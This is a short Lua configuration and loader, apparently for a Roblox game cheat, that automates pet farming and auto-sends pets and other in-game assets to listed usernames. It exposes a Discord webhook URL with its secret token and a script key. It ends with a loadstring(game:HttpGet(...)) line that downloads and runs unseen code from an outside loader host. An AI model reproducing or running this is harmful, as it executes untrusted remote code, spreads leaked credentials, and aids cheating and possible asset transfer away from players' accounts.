getgenv().Config = {
SERVER_HOP = false, -- true: bật hop server, false: tắt hop server
    DPS_THRESHOLDS = {
        HOUSE1 = { '>0' },
        HOUSE2 = { '1000~3000', '>10000' },
        HOUSE3 = { '3000~6500', '>16000' },
        HOUSE4 = { '6000~9000', '>23000' },
        HOUSE5 = { '8300~22000' },
        HOUSE6 = { '>25000'},
    },
    plant = {
        PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7, 8, 9 }, -- slot đặt pet, put pet
        EGG_SLOTS = { 10 }, -- slot dành cho trứng -- slot đặt trứng , put egg
    },
    SEND_PET = {
        Usernames = { 'OKkMma_b' },
        PetSendInterval = 20,
        SEND_ALL = true, -- true: gửi tất cả pet Configsendsend, false: chỉ gửi Name_Pet
        Name_Pet = {
            'Huge Evil Raven',
            'Huge Skeleton Snake',
            'Huge Vampire Agony',
        },
    },
    SEND_DIAMONDS = {
        Usernames = { ''}, -- 'name1', 'name2', 'name3'
        MinDiamonds = 40000000,
    },
    SEND_ITEM = { 
        Usernames = { ''}, ---'name1', 'name2', 'name3'
        ['Spectral Potion'] = { amount = 3 },
    },
    SEND_EGGS = {
        Usernames = { ''}, ---'name1', 'name2', 'name3'
        ['Exclusive Egg 56'] = true,
    },
    Webhook = {
        ID = '1254610781677289522', -- Discord ID d? tag
        IdNames = { 'Huge', 'Titanic' }, -- Pet c?n theo dõi
        URL = 'https://discord.com/api/webhooks/1312555300808818768/sLXhl-mfBsOu8Wy_vfzP9tpu-DIDUmLGUkHzMOKzOzvSpB0PV4-glDoP_FFpSJRVET3_', -- URL webhook private
    },
}
script_key="sIYcxSQDFrAKYdBBvlwpyYVPAeVELjbC";
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7c082a1ad968228f9d5e0d6eb722ca19.lua"))()
